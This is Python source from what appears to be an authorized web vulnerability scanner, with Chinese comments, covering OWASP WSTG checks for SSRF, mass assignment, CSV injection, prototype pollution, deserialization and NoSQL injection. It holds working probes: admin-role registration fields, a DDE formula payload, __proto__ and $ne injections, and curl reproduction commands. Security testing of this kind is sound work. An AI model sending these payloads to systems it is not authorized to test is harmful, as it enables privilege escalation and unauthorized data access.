            compliance="等保2.0 安全计算环境-入侵防范 / CWE-918",
            evidence=[finding_evidence("response", f"{frag}\n测试地址：{test_url}",
                                       "SSRF 初判响应")],
            grading_basis="实测服务端按参数发起请求，返回内部地址内容；利用深度未完全展开，按 B 级定高危",
        ))

    if not cands:
        return no_target_outcome(ctx, "可作为请求目标的 URL 类参数",
                                 probes=probes, evidence_kind="URL 参数实测")

    note = ((f"按参数名关键词未命中，已对全部 {len(cands)} 个参数降级探测；"
             if degraded else "")
            + f"候选参数 {len(cands)} 个（候选池 {len(params)} 个），"
            + f"实测 {probes} 次，命中 {len(hits)} 处")
    return found(note, findings, probes=probes, evidence_kind="URL 参数实测")


# ======================================================================
# WSTG-INPV-20 批量赋值
#
# 2026-10-10：挂上自动侦察（recon_inpv20）。
#   起因是 Strix 在 Juice Shop 上 10 分钟挖出「注册时注入 role:admin 直接
#   建成管理员」—— 而本项此前是纯人工项，只给指引不动手。批量赋值的判定
#   其实不需要业务知识：**注册接口把客户端给的角色字段原样落库**，这个事实
#   由「对照组正常注册」与「实验组带特权字段注册」两次真实请求就能确立
#   （红线 33 三段式差分：另一字段也变 → PROVEN）。
#   因此它属于「可做掉的那部分枯燥活」，侦察层做掉，人工只复核结论。
#
#   约束（缺一不可，红线 7 / 24 / 33）：
#     ① deep 档；② 台账显式授权写；③ 全局 POST 预算（跨项共享，不重试）
#     ④ 只建**自己的**测试账号，不碰他人数据，不还原需求以外的状态。
# ======================================================================
# 不该由客户端决定的字段。逐个试太多，这里一次带上全部，靠响应回显判定
# 「服务端是否把它们绑进了对象」——回显即绑定，绑定即批量赋值成立。
_PRIV_FIELDS: dict[str, object] = {
    "role": "admin",
    "roles": ["admin"],
    "isAdmin": True,
    "is_admin": True,
    "admin": True,
    "userType": "admin",
    "permissions": ["admin"],
}
_PRIV_ECHO_RE = re.compile(
    r'"(?:role|roles|userType)"\s*:\s*"?\[?\s*"?admin|'
    r'"(?:isAdmin|is_admin|admin)"\s*:\s*(?:true|1)', re.I)
_ROLE_IN_TOKEN_RE = re.compile(r'"role"\s*:\s*"admin"', re.I)


def recon_inpv20(ctx: DetectorContext) -> ReconOutcome:
    """注册接口的批量赋值自动侦察：对照组 vs 带特权字段组。

    只在「能注册」的目标上有意义 —— 没有开放注册时退场并说明原因，
    绝不说「没发现」（未执行 ≠ 通过，红线 1）。
    """
    # 复用 recon_identity 的同名私有实现：侦察「没跑」的原因措辞必须全项目一致，
    # 另写一份必然漂移（ran=False 的每一种原因都要能被说出来，红线 37）。
    _manual_only = recon_id._manual_only
    if not ctx.risk_allowed(RISK_DEEP):
        return _manual_only("当前档位不允许发起注册类写请求（批量赋值必须用真实 POST 验证）")
    if not ctx.allow_write:
        return _manual_only(
            "授权台账未对本目标显式授权写操作 —— 批量赋值需要真实提交表单 / 接口请求，"
            "未授权时不执行（补齐方式：授权台账对该目标置 allow_write_test: true）")

    from urllib.parse import urljoin  # noqa: PLC0415
    import secrets  # noqa: PLC0415
    try:
        from engine import regself as _rs  # noqa: PLC0415
        from engine.sessionpool import _fetch  # noqa: PLC0415
    except Exception as e:  # noqa: BLE001
        return _manual_only(f"依赖模块不可用：{type(e).__name__}: {str(e)[:80]}")

    # 候选端点：红队自取注册已经验证过的优先，其次常见路径 + 前端产物里的语义端点
    cands = list(_rs._REGISTER_API_PATHS)
    for u in (ctx.js_result.get("urls") or []):
        if isinstance(u, str) and re.search(r"/(regist|signup|user)s?(/|$|\?)", u, re.I):
            cands.append(u)
    seen: list[str] = []
    for c in cands:
        u = c if str(c).startswith("http") else urljoin(ctx.target_url, str(c).lstrip("/"))
        if ctx.domain in u and u not in seen:
            seen.append(u)

    if not seen:
        return _manual_only("未定位到任何注册 / 建号接口，无法做批量赋值对照")

    import requests  # noqa: PLC0415

    sess = requests.Session()
    # 环境代理会把 POST 路由错、让 SPA 首页 200 冒充「注册成功」——
    # 这是 regself 实测踩过的第一个坑，身份类请求一律禁信环境代理。
    sess.trust_env = False
    timeout = int(getattr(ctx.client, "timeout", 12) or 12)

    tag = secrets.token_hex(3)
    base_payload = {
        "email": f"aiscan_ma_{tag}@example.test",
        "password": "AiScan!" + secrets.token_hex(4),
        "passwordRepeat": "",
    }
    base_payload["passwordRepeat"] = base_payload["password"]

    probes = 0
    tried: list[str] = []
    for url in seen[:3]:
        # ---- 对照组：正常注册（不带任何特权字段）----
        st1, body1 = _rs._post_json(sess, url, dict(base_payload), timeout)
        probes += 1
        tried.append(f"{url} → {st1}")
        if st1 not in (200, 201):
            continue
        if _PRIV_ECHO_RE.search(body1 or ""):
            # 连对照组都回显 admin —— 那是别的问题（默认给管理员），不是批量赋值
            pass
        # ---- 实验组：同样的数据，附带本不该由客户端决定的字段 ----
        exp = dict(base_payload)
        exp["email"] = f"aiscan_mb_{tag}@example.test"
        exp.update(_PRIV_FIELDS)
        st2, body2 = _rs._post_json(sess, url, exp, timeout)
        probes += 1
        if st2 not in (200, 201):
            continue
        # 判据（必须落在**实验组自己的响应**上，红线 20：复核打在命中所在地址）：
        #   ① 实验组回显了管理员角色/特权字段；② 对照组没有 → 字段被绑定进对象
        hit_exp = bool(_PRIV_ECHO_RE.search(body2 or ""))
        hit_ctl = bool(_PRIV_ECHO_RE.search(body1 or ""))
        # 令牌里也认：有些实现不回显实体，但下发的令牌直接带 role:admin
        tok_admin = bool(_ROLE_IN_TOKEN_RE.search(body2 or ""))
        if (hit_exp and not hit_ctl) or tok_admin:
            f = make_finding(
                "WSTG-INPV-20", "注册接口批量赋值：客户端可写入角色字段并建成管理员",
                ctx.target_name, endpoint=url, method="POST",
                param="role / isAdmin / permissions",
                severity="严重", confidence="High", evidence_level="A",
                description=("对同一注册接口发两次真实请求：对照组只带正常字段，"
                             "实验组额外带上「role / isAdmin / permissions」等"
                             "本不该由客户端决定的字段。服务端**把实验组的特权字段"
                             "原样写入了账号对象**（对照组没有），说明接口直接把请求体"
                             "绑定到实体、没有做字段白名单。"),
                technical_detail=(f"端点：{url}\n"
                                  f"对照组（正常字段）：HTTP {st1}，响应不含管理员角色声明\n"
                                  f"实验组（附 role=admin 等）：HTTP {st2}，"
                                  f"响应/令牌中出现管理员角色"
                                  f"（{'实体回显' if hit_exp else '令牌载荷'}）\n"
                                  f"响应片段：{(body2 or '')[:300]}"),
                impact=("任何人都可以在注册（或资料更新）时给自己授予管理员角色，"
                        "直接接管后台与全部数据。这是权限体系的完全失效。"),
                reproduction=(f"curl -s -X POST '{url}' -H 'Content-Type: application/json'"
                              " -d '{\"email\":\"t1@example.test\",\"password\":\"Test@12345\","
                              "\"passwordRepeat\":\"Test@12345\",\"role\":\"admin\"}'\n"
                              "# 再用该账号登录，确认令牌/接口返回的角色为 admin"),
                remediation=("① 服务端用 DTO / VO 显式白名单接收字段，禁止把请求体"
                             "直接绑定到实体对象；"
                             "② 角色、权限、余额、租户归属等字段只在服务端赋值；"
                             "③ 框架层关闭自动绑定（如 Spring 的 @InitBinder 白名单、"
                             "Laravel 的 $fillable）；"
                             "④ 注册与资料更新接口分开设字段集合，注册只收最小集。"),
                compliance="OWASP ASVS 5.1 / CWE-915 / 等保2.0 安全计算环境-访问控制",
                evidence=[finding_evidence("response", (body2 or "")[:600], f"批量赋值回显 {url}")],
                grading_basis="对照 + 实验两次真实注册请求，实验组特权字段落库，证据级 A，定严重",
            )
            return ReconOutcome(
                ran=True, findings=[f], probes=probes,
                note=(f"对 {len(tried)} 个注册接口做对照实验（{'; '.join(tried)}）："
                      f"实验组附加 role/isAdmin/permissions 后，服务端在响应中回显了"
                      f"管理员角色 —— 批量赋值成立，已确证。"),
                lead=[f"确证端点：{url}",
                      "人工复核：用实验组账号登录后台，确认是否真的具备管理员权限"],
            )
        return ReconOutcome(
            ran=True, probes=probes,
            note=(f"对 {url} 做对照实验：对照组 HTTP {st1}、实验组 HTTP {st2}，"
                  f"实验组响应未回显管理员角色 —— 未确证批量赋值（不等于不存在，"
                  f"本轮只试了注册通道与这一组字段）"),
            lead=[f"已试端点：{url}",
                  "未覆盖：资料更新 / 订单提交等其他写入通道，仍需人工逐字段试探"],
        )
    return _manual_only(
        f"已试 {len(tried)} 个注册接口，均未能完成一次成功注册（{'; '.join(tried)}）—— "
        "无法建立对照实验，本项转人工",
        extra="补齐方式：确认目标是否开放注册；未开放注册的系统请人工用测试账号按指引逐字段试探。")


@make_manual(
    "WSTG-INPV-20", name="批量赋值（Mass Assignment）测试",
    procedure=("⚠️ 使用测试账号，改动前先记录原始值，验证后还原。\n"
               "1) 构造一个正常的资料更新请求（改昵称 / 改备注），完整抓包；\n"
               "2) 在请求体中追加【不该由用户修改的字段】，逐个测试并观察响应：\n"
               "   role / isAdmin / is_admin / userType / permission / status\n"
               "   balance / points / integral / credit / level / vipLevel\n"
               "   tenantId / orgId / companyId / deptId / parentId\n"
               "   createTime / id / userId / ownerId / verified / emailVerified\n"
               "3) 提交后重新查询该对象，确认字段是否真的被写入（不要只看响应状态码）；\n"
               "4) 检查响应中是否回显了这些字段（回显即说明该字段在服务端对象里）；\n"
               "5) 验证完成后立即还原所有被修改的字段。"),
    expect=("服务端使用 DTO / VO 显式白名单接收字段，不直接把请求体绑定到实体对象；"
            "角色、余额、租户等敏感字段不接受客户端写入。"),
    why_manual="必须真实提交写请求并复查写入结果，属写操作；且需逐字段试探，无法靠只读请求判定。",
    requires=["测试账号", "write"], risk=RISK_DEEP, tool="人工核查",
    recon=recon_inpv20,
)
def _inpv20(ctx: DetectorContext):  # pragma: no cover
    return ok("")


# ======================================================================
# WSTG-INPV-21 CSV 注入
# ======================================================================
@make_manual(
    "WSTG-INPV-21", name="CSV / 导出注入测试",
    procedure=("1) 找到所有导出功能（导出 Excel / CSV / 报表）；\n"
               "2) 在任意可写入并被导出的字段中填入以公式起始符开头的内容：\n"
               "   =1+1 、 +1+1 、 -1+1 、 @SUM(1+1) 、 "
               "以及 DDE 形式 =cmd|'/c calc'!A0\n"
               "3) 导出文件并用 Excel / WPS 打开，观察是否弹出公式计算提示或执行；\n"
               "4) 同时检查导出的 CSV 中该字段是否被双引号包裹并做了前缀转义（' 号）；\n"
               "5) 检查导出接口本身是否有越权（能否导出他人 / 全量数据，另见 EXT-DP-03）。"),
    expect=("导出时对以 = + - @ 开头的字段加前缀（'）或强制文本格式；"
            "高风险导出（含用户输入）优先用不支持公式的格式（如 xlsx 并设为文本列）。"),
    why_manual="需要真实写入数据并下载打开导出文件，涉及写入与桌面端行为观察。",
    requires=["write"], risk=RISK_DEEP, tool="人工核查",
)
def _inpv21(ctx: DetectorContext):  # pragma: no cover
    return ok("")


# ======================================================================
# WSTG-INPV-22 原型污染
# ======================================================================
@make_auto("WSTG-INPV-22", name="原型污染与不安全对象合并检测", tool="前端产物静态分析",
           risk=RISK_STANDARD, requires=["js"], evidence_kind="前端产物实测",
           detector_ref="checks/injection.py:inpv22")
def inpv22(ctx: DetectorContext):
    findings = []
    hits = code_scan(ctx, [
        (r"\$\.extend\s*\(\s*true", "jQuery $.extend 深拷贝"),
        (r"Object\.assign\s*\(\s*\w+\s*,\s*(?:JSON\.parse|req\.|params|query|body)",
         "Object.assign 直接合并外部输入"),
        (r"lodash.*(?:merge|defaultsDeep)", "lodash merge / defaultsDeep"),
        (r"(?:deepMerge|deepExtend|mergeObj|extendDeep)\s*\(", "自定义深合并函数"),
        (r"__proto__", "出现 __proto__ 引用"),
        (r"constructor\s*\.\s*prototype", "出现 constructor.prototype 访问"),
        (r"for\s*\(\s*(?:var|let|const)?\s*\w+\s+in\s+\w+\s*\)\s*\{[^}]*\w+\[\w+\]\s*=",
         "for-in 循环赋值（原型污染典型模式）"),
    ])
    # 参数层面的探测（GET 语义，只读）
    probes = 0
    params = extract_params(ctx)
    for p in params[:5]:
        url, pname = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        probes += 1
        r = _inject(ctx, url, pname, f"__proto__[{MARK}]=1")
        if r is None:
            continue
        probe, _ = r
        if getattr(probe, "status", 0) >= 500:
            hits.append((f"参数 {pname} 携带 __proto__ 后返回 "
                         f"{getattr(probe, 'status', 0)}", "服务端对象合并异常"))

    if hits:
        findings.append(make_finding(
            "WSTG-INPV-22", f"存在原型污染风险点（{len(hits)} 处）",
            ctx.target_name, endpoint=ctx.target_url,
            severity="中危", confidence="Medium", evidence_level="B",
            description=("前端产物中出现了会递归合并对象、且输入可能来自外部数据的代码模式。"
                         "这类模式在合并 JSON 请求体时，可被 __proto__ 键污染全局原型。"),
            technical_detail="命中的代码模式：\n" + "\n".join(
                f"  · {d}\n    {p}" for p, d in hits[:10]),
            impact=("原型污染后可影响同一页面内所有对象的行为："
                    "篡改配置对象（如 isAdmin 判断）、注入默认属性、"
                    "在部分框架中可升级为 XSS 甚至服务端 RCE"
                    "（视合并库版本与使用方式而定）。"),
            reproduction=("对涉及对象合并的接口提交 JSON："
                          '{"__proto__":{"aiscan_polluted":1}}，'
                          "并在后续请求中检查该属性是否被继承。"),
            remediation=("① 合并外部数据前用白名单过滤键名，拒绝 __proto__ / constructor / prototype；"
                         "② 使用 Object.create(null) 作为合并目标；"
                         "③ 升级 lodash 等依赖到已修复版本；"
                         "④ 服务端 JSON 解析同样过滤危险键名。"),
            compliance="等保2.0 安全计算环境-入侵防范 / CWE-1321",
            evidence=[finding_evidence("file", str(hits[:10]), "原型污染代码模式")],
            grading_basis="静态匹配到危险合并模式，未实证可污染，按 B 级定中危",
        ))

    note = (f"静态匹配 {len(hits)} 处危险合并模式"
            + f"；参数探测 {probes} 次")
    return found(note, findings, probes=probes + 1, evidence_kind="前端产物静态分析")


# ======================================================================
# WSTG-INPV-23 不安全反序列化
# ======================================================================
@make_auto("WSTG-INPV-23", name="不安全反序列化特征检测", tool="内置检测器 + 前端分析",
           risk=RISK_STANDARD, evidence_kind="序列化特征实测",
           detector_ref="checks/injection.py:inpv23")
def inpv23(ctx: DetectorContext):
    findings = []
    hits = []
    recs_vals = [r.get("value", "") for r in
                 [{"value": v} for v in (getattr(ctx.root, "cookies", []) or [])]]
    blobs = "\n".join(list(ctx.js_result.get("bodies") or []) + [ctx.baseline_body])
    cookie_raw = ctx.root_headers.get("set-cookie", "")

    # 1) Java 序列化魔数（Base64 形态 rO0AB）
    if re.search(r"\brO0AB[A-Za-z0-9+/=]{10,}", cookie_raw + blobs):
        hits.append(("Java 序列化对象（rO0AB 魔数）",
                     "若服务端反序列化用户可控数据，可导致 RCE（ysoserial 链）"))
    # 2) PHP 序列化
    if re.search(r'(?:^|[^\\])O:\d+:"[A-Za-z_\\]+\":\d+:\{', cookie_raw + blobs):
        hits.append(("PHP serialize 结构（O:长度:\"类名\"）",
                     "可利用 __wakeup / __destruct 魔术方法形成 POP 链"))
    # 3) Python pickle
    if re.search(r"gASV[A-Za-z0-9+/=]{8,}|c__builtin__\n|cos\nsystem", cookie_raw + blobs):
        hits.append(("Python pickle 载荷",
                     "pickle 反序列化可直接执行任意代码"))
    # 4) .NET ViewState（未开启 MAC）
    for m in re.finditer(r"__VIEWSTATE[^=]*=([^&;\"]+)", blobs):
        val = m.group(1)
        if len(val) > 40 and "__VIEWSTATEGENERATOR" in blobs and "__EVENTVALIDATION" not in blobs:
            hits.append((".NET ViewState 未见配套校验字段",
                         "未启用 MAC 的 ViewState 可被篡改并反序列化执行"))
            break
    # 5) 前端 JSON.parse 直接消费不可信字符串
    if re.search(r"JSON\.parse\s*\(\s*(?:location|window\.location|document\.cookie|"
                 r"localStorage|sessionStorage)", blobs):
        hits.append(("前端 JSON.parse 直接解析可控存储 / 地址",
                     "可被注入恶意结构影响后续逻辑"))

    if hits:
        findings.append(make_finding(
            "WSTG-INPV-23", f"发现 {len(hits)} 处不安全反序列化特征",
            ctx.target_name, endpoint=ctx.target_url,
            severity="高危", confidence="Medium", evidence_level="B",
            description=("在 Cookie、前端产物或页面中出现了序列化对象的特征。"
                         "若服务端反序列化用户可控的这类数据，可直接导致远程代码执行。"),
            technical_detail="命中特征：\n" + "\n".join(
                f"  · {n}\n    风险：{w}" for n, w in hits),
            impact=("反序列化漏洞通常是「一发致命」级别："
                    "攻击者构造特定序列化载荷即可执行系统命令、"
                    "读取任意文件或建立持久化后门。"),
            reproduction=("定位上述数据对应的服务端处理接口，"
                          "在测试环境中替换为已知的探测载荷（不执行破坏性命令），"
                          "观察是否触发反序列化行为。"),
            remediation=("① 不使用原生序列化格式传递数据，改用 JSON；"
                         "② 必须反序列化时，仅允许白名单类并禁用危险魔术方法；"
                         "③ ViewState 启用 MAC（`enableViewStateMac=true`）并设置强 machineKey；"
                         "④ 依赖库升级到已修复反序列化问题的版本。"),
            compliance="等保2.0 安全计算环境-入侵防范 / CWE-502",
            evidence=[finding_evidence("token", str(hits[:10]), "反序列化特征")],
            grading_basis="匹配到序列化特征，服务端处理逻辑未实证，按 B 级定高危",
        ))

    note = f"检测到不安全反序列化特征 {len(hits)} 处"
    return found(note, findings, probes=1, evidence_kind="序列化特征实测")


# ======================================================================
# WSTG-INPV-24 NoSQL 注入
#
# 2026-10-10 新增：靶场答案表把 NoSQL 家族三项（Exfiltration / Manipulation /
# DoS）整体判为「能力缺口」——全量检查项里没有任何一项声明负责 NoSQL 语义注入，
# 清单层面的缺口不能靠「SQL 那套顺带覆盖」蒙过去，它根本不是同一套语法。
# ======================================================================
def _resp_tuple(r: Any) -> tuple[int, int, str]:
    if isinstance(r, dict):
        body = str(r.get("body") or "")
        return int(r.get("status") or 0), len(body), body
    body = getattr(r, "body_snippet", "") or ""
    return int(getattr(r, "status", 0) or 0), len(body), body


def _json_records(body: str) -> int:
    """返回响应里的记录条数；判不出来返回 -1（绝不伪造成 0，红线 34 同款陷阱）。"""
    try:
        obj = json.loads(body)
    except Exception:  # noqa: BLE001
        return -1
    if isinstance(obj, list):
        return len(obj)
    if isinstance(obj, dict):
        for key in ("data", "items", "rows", "results", "list"):
            v = obj.get(key)
            if isinstance(v, list):
                return len(v)
        if isinstance(obj.get("total"), int):
            return obj["total"]
    return -1


def _nosql_differs(base: Any, probe: Any) -> tuple[bool, str]:
    """中性值与运算符值的差异判据 —— 没有差异就是没注入，不做任何推测。"""
    sb, lb, bb = _resp_tuple(base)
    sp, lp, bp = _resp_tuple(probe)
    if sp == 0:
        return False, ""
    if {sb, sp} & {400, 401, 403, 404} and sp in (200, 201) and sb != sp:
        return True, f"中性值返回 HTTP {sb}，注入运算符后返回 HTTP {sp}（校验被绕过）"
    nb, np_ = _json_records(bb), _json_records(bp)
    if nb >= 0 and np_ > nb and np_ >= max(nb * 2, nb + 1):
        return True, f"返回记录数由 {nb} 条变为 {np_} 条（查询条件被放宽）"
    if sb == sp and lp > lb + 200 and lp > lb * 1.5:
        return True, f"同一状态（HTTP {sp}）下响应长度由 {lb} 增至 {lp}"
    return False, ""


@make_auto("WSTG-INPV-24", name="NoSQL 注入检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="查询语义对照实测",
           detector_ref="checks/injection.py:inpv24")
def inpv24(ctx: DetectorContext):
    """NoSQL 注入：判「查询语义被运算符改写」，不是判「参数被回显」。

    两条通道都强制配**中性值对照**（红线 9）—— 只发一次 `{"$ne": ""}` 就报
    漏洞，等价于把「接口返回了东西」当成「注入成立」。判据只有三类：
      ① 中性值被拒（4xx）而运算符值通过（2xx）；
      ② 记录条数显著变多；
      ③ 同状态下响应长度显著变长。
    三者都不成立就是没测出来，如实写「未确证」。

    DoS 类载荷（`$where` 自引用、超大 `$regex` 回溯）一律不做（红线 11）。
    JSON 请求体通道属受控写，需 deep 档 + 台账授权；门没开就写清原因。
    """
    params = extract_params(ctx)
    if not params:
        return no_target_outcome(ctx, "带参数的接口端点（NoSQL 注入面）",
                                 probes=0, evidence_kind="无候选参数")
    apiish = [p for p in params
              if re.search(r"(/api/|/rest/|/v[1-9]/|graphql)", p["url"], re.I)]
    cands = (apiish or params)[:4]
    neutral = "aiscanneutral"
    probes = 0
    findings: list[Any] = []
    write_note = ""

    for p in cands:
        url, k = p["url"], p["param"]
        if not url.startswith("http") or ctx.domain not in url:
            continue
        parsed = urlparse(url)

        # ---- 通道一：查询串对象语法（只读 GET，任何档位都做）----
        try:
            rb = ctx.get(parsed._replace(query=urlencode({k: neutral})).geturl(),
                         allow_redirects=False)
            ro = ctx.get(parsed._replace(query=urlencode(
                {f"{k}[$ne]": neutral, k: neutral})).geturl(), allow_redirects=False)
        except Exception:  # noqa: BLE001
            rb = ro = None
        if rb is not None and ro is not None:
            probes += 2
            hit, why = _nosql_differs(rb, ro)
            if hit:
                findings.append(_nosql_finding(ctx, url, k, f"{k}[$ne]={neutral}", "GET", why))
                break

        # ---- 通道二：JSON 请求体（受控写，deep + 台账授权）----
        if ctx.risk_allowed(RISK_DEEP):
            try:
                r1 = ctx.data_submit(url, {k: neutral}, method="POST", as_json=True,
                                     budget_key="inpv24_nosql", max_total=8)
                r2 = ctx.data_submit(url, {k: {"$ne": neutral}}, method="POST",
                                     as_json=True, budget_key="inpv24_nosql", max_total=8)
            except PermissionError as e:  # noqa: BLE001
                write_note = f"；JSON 体通道未执行：{e}"
                break
            probes += 2
            hit, why = _nosql_differs(r1, r2)
            if hit:
                findings.append(_nosql_finding(
                    ctx, url, k, '{"%s": {"$ne": "%s"}}' % (k, neutral), "POST", why))
                break

    note = (f"对 {len(cands)} 个接口做 NoSQL 语义对照 {probes} 次"
            f"{write_note}，"
            f"{'确证 ' + str(len(findings)) + ' 处查询语义被改写' if findings else '未确证 NoSQL 注入'}")
    return found(note, findings, probes=probes, evidence_kind="查询语义对照实测")


def _nosql_finding(ctx: DetectorContext, url: str, k: str, payload: str,
                   method: str, why: str) -> Any:
    sev = "高危" if ("绕过" in why or "放宽" in why) else "中危"
    return make_finding(
        "WSTG-INPV-24", f"NoSQL 注入（参数 {k}）",
        ctx.target_name, endpoint=url, method=method, param=k,
        severity=sev, confidence="High", evidence_level="A",
        description=(f"向参数 `{k}` 提交 MongoDB 查询运算符后，服务端的查询语义被改写：{why}。"
                     "同样的接口提交中性值时不会出现这种差异，"
                     "说明该参数的值被当作查询条件的一部分直接拼进了数据库查询。"),
        technical_detail=(f"接口：{url}\n参数：{k}\n"
                          f"中性值：aiscanneutral\n载荷：{payload}\n"
                          f"判据：{why}\n"
                          "（Do S 类载荷未使用；本次不读取、不导出任何业务数据）"),
        impact=("攻击者可用 `$ne` / `$gt` / `$regex` 改写查询条件："
                "绕过登录校验（`$ne` 匹配任意值即通过）、"
                "取回本不属于自己的记录、或逐字符盲拖他人数据。"
                "这与 SQL 注入同级，但很多团队只防了 SQL。"),
        reproduction=(f"curl -s '{url}' --get --data-urlencode '{k}[$ne]=aiscanneutral' "
                      "与中性值响应对比" if method == "GET" else
                      f"curl -s -X POST '{url}' -H 'Content-Type: application/json' "
                      f"-d '{{\"{k}\": {{\"$ne\": \"\"}}}}' 与中性值响应对比"),
        remediation=("① 入参按类型强制校验，收到对象/数组直接拒绝（如 express 用 "
                     "mongo-sanitize 或显式 typeof 检查）；"
                     "② 查询一律用参数化绑定，禁止把用户输入拼成查询对象；"
                     "③ 认证接口不要直接把请求体当查询条件。"),
        compliance="等保2.0 安全计算环境-入侵防范 / CWE-943",
        evidence=[finding_evidence("response", why, f"NoSQL 语义差异 {k}")],
        grading_basis=f"对照实验确证查询语义被改写（{why}），定{sev}",
    )
